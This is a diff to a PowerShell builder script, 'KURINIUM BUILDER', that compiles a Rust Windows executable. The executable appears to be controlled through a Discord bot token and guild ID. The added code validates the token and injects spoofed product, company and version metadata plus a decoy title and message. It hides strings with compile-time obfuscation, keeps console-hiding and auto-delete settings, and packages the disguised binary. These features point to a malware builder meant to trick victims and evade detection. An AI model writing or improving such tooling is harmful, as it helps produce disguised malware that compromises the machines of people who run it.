@@ -43,7 +43,63 @@ function Format-EncryptedBytes {
     return "enc![$formatted]"
 }
 
+function Test-Environment {
+    Write-Host "[WAIT] Checking environment..." -ForegroundColor Yellow
+    
+    # Check Rust
+    if (-not (Get-Command cargo -ErrorAction SilentlyContinue)) {
+        Write-Host "[FAIL] Rust/Cargo not found! Please install Rust." -ForegroundColor Red
+        exit 1
+    }
+    
+    # Check Target
+    $targets = rustup target list --installed
+    if (-not ($targets -contains "x86_64-pc-windows-msvc")) {
+        Write-Host "[WARN] Target x86_64-pc-windows-msvc not found. Installing..." -ForegroundColor Yellow
+        rustup target add x86_64-pc-windows-msvc
+    }
+    
+    Write-Host "[OK] Environment ready." -ForegroundColor Green
+    Write-Host ""
+}
+
+function Test-DiscordToken {
+    param($token)
+    try {
+        $headers = @{ "Authorization" = "Bot $token" }
+        $response = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -ErrorAction Stop
+        Write-Host "    [SUCCESS] Token Validated: $($response.username)#$($response.discriminator) (ID: $($response.id))" -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "    [ERROR] Invalid Token: $($_.Exception.Message)" -ForegroundColor Red
+        if ($_.Exception.Response) {
+             # Write-Host "    Response: $($_.Exception.Response.StatusCode)" -ForegroundColor Red
+        }
+        return $false
+    }
+}
+
+function Validate-Inputs {
+    param($config)
+    
+    Write-Host "Verifying inputs..." -ForegroundColor Yellow
+
+    # Validate Discord Token (Online Check)
+    if (-not (Test-DiscordToken -token $config.token)) {
+        Write-Host "[FAIL] Token validation failed! Please check your token." -ForegroundColor Red
+        exit 1
+    }
+    
+    # Validate Guild ID
+    if ($config.guildId -match "\D") {
+        Write-Host "[FAIL] Guild ID must be numeric!" -ForegroundColor Red
+        exit 1
+    }
+}
+
 Clear-Host
+Test-Environment
+
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Red
 Write-Host "        KURINIUM BUILDER v3.0          " -ForegroundColor Cyan
@@ -202,36 +258,41 @@ Write-Host ""
 $configPath = Join-Path $PSScriptRoot "src\config.rs"
 $configContent = Get-Content $configPath -Raw
 
-# Generate encrypted values
-$fileNameEnc = Format-EncryptedBytes (XOR-Encrypt $config.fileName $XOR_KEY)
-$productNameEnc = Format-EncryptedBytes (XOR-Encrypt $config.productName $XOR_KEY)
-$descriptionEnc = Format-EncryptedBytes (XOR-Encrypt $config.description $XOR_KEY)
-$companyNameEnc = Format-EncryptedBytes (XOR-Encrypt $config.companyName $XOR_KEY)
-$fileVersionEnc = Format-EncryptedBytes (XOR-Encrypt $config.fileVersion $XOR_KEY)
+# Helper for strict Rust string escaping
+function Escape-ForRust {
+    param($str)
+    if (-not $str) { return "" }
+    return $str.Replace("\", "\\").Replace("`"", "\`"")
+}
 
-# Update Guild ID
-$configContent = $configContent -replace 'pub const GUILD_ID: u64 = \d+;', "pub const GUILD_ID: u64 = $($config.guildId);"
-
-# Update SHOW_CONSOLE (both debug and release)
-$consoleValue = if ($config.showConsole) { "true" } else { "false" }
-$configContent = $configContent -replace '(#\[cfg\(debug_assertions\)\]\s*impl Config \{\s*pub const SHOW_CONSOLE: bool = )(true|false);', "`$1$consoleValue;"
-$configContent = $configContent -replace '(#\[cfg\(not\(debug_assertions\)\)\]\s*impl Config \{\s*pub const SHOW_CONSOLE: bool = )(true|false);', "`$1$consoleValue;"
-
-# Update encrypted_strings functions using regex patterns
+# Update encrypted_strings functions using regex patterns - injecting raw strings for compile-time obfuscation
 # file_name
-$configContent = $configContent -replace '(// [^\r\n]*\r?\n\s*pub fn file_name\(\) -> String \{\s*xor_decrypt\()enc!\[[^\]]+\](\))', "`$1$fileNameEnc`$2"
+$safeFileName = Escape-ForRust $config.fileName
+$configContent = $configContent -replace '(pub fn file_name\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeFileName`${2}"
 
 # product_name
-$configContent = $configContent -replace '(// [^\r\n]*\r?\n\s*pub fn product_name\(\) -> String \{\s*xor_decrypt\()enc!\[[^\]]+\](\))', "`$1$productNameEnc`$2"
+$safeProductName = Escape-ForRust $config.productName
+$configContent = $configContent -replace '(pub fn product_name\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeProductName`${2}"
 
 # description
-$configContent = $configContent -replace '(// [^\r\n]*\r?\n\s*pub fn description\(\) -> String \{\s*xor_decrypt\()enc!\[[^\]]+\](\))', "`$1$descriptionEnc`$2"
+$safeDescription = Escape-ForRust $config.description
+$configContent = $configContent -replace '(pub fn description\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeDescription`${2}"
 
 # company_name
-$configContent = $configContent -replace '(// [^\r\n]*\r?\n\s*pub fn company_name\(\) -> String \{\s*xor_decrypt\()enc!\[[^\]]+\](\))', "`$1$companyNameEnc`$2"
+$safeCompanyName = Escape-ForRust $config.companyName
+$configContent = $configContent -replace '(pub fn company_name\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeCompanyName`${2}"
 
 # file_version
-$configContent = $configContent -replace '(// [^\r\n]*\r?\n\s*pub fn file_version\(\) -> String \{\s*xor_decrypt\()enc!\[[^\]]+\](\))', "`$1$fileVersionEnc`$2"
+$safeVersion = Escape-ForRust $config.fileVersion
+$configContent = $configContent -replace '(pub fn file_version\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$safeVersion`${2}"
+
+$decoyTitleSafe = Escape-ForRust $config.decoyTitle
+
+$decoyMessagePre = Escape-ForRust $config.decoyMessage
+$decoyMessageSafe = $decoyMessagePre -replace "`r`n", "\n" -replace "`n", "\n"
+
+$configContent = $configContent -replace '(pub fn decoy_title\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$decoyTitleSafe`${2}"
+$configContent = $configContent -replace '(pub fn decoy_message\(\) -> String \{\s*obfstr::obfstr!\(")[^"]+("\)\.to_string\(\))', "`${1}$decoyMessageSafe`${2}"
 
 # Update autodelete config
 $autoDeleteEnabled = if ($config.autoDelete) { "true" } else { "false" }
@@ -260,18 +321,40 @@ Write-Host "            BUILDING RELEASE           " -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Red
 Write-Host ""
 
+Validate-Inputs $config
+
 $env:KURINIUM_TOKEN = $config.token
 Set-Location $PSScriptRoot
 cargo build --release
 
 if ($LASTEXITCODE -eq 0) {
+    $distDir = Join-Path $PSScriptRoot "dist"
+    if (-not (Test-Path $distDir)) {
+        New-Item -ItemType Directory -Path $distDir -Force | Out-Null
+    }
+
+    $targetPath = Join-Path $PSScriptRoot "target\release\kurinium.exe"
+    $finalName = if ($config.fileName.EndsWith(".exe")) { $config.fileName } else { "$($config.fileName).exe" }
+    $finalPath = Join-Path $distDir $finalName
+    $pdbPath = Join-Path $PSScriptRoot "target\release\kurinium.pdb"
+
+    Copy-Item -Path $targetPath -Destination $finalPath -Force
+    if (Test-Path $pdbPath) { Remove-Item $pdbPath -Force }
+
+    $hash = Get-FileHash -Path $finalPath -Algorithm SHA256
+    $checksumPath = Join-Path $distDir "checksums.txt"
+    "$($hash.Hash)  $finalName" | Set-Content $checksumPath
+
     Write-Host ""
     Write-Host "========================================" -ForegroundColor Green
     Write-Host "          BUILD SUCCESSFUL!            " -ForegroundColor Green
     Write-Host "========================================" -ForegroundColor Green
     Write-Host ""
-    Write-Host "Output: .\target\release\kurinium.exe" -ForegroundColor Yellow
+    Write-Host " [Artifact] $finalPath" -ForegroundColor Yellow
+    Write-Host " [Checksum] $checksumPath" -ForegroundColor Gray
     Write-Host ""
+
+    Invoke-Item $distDir
 } else {
     Write-Host ""
     Write-Host "BUILD FAILED!" -ForegroundColor Red
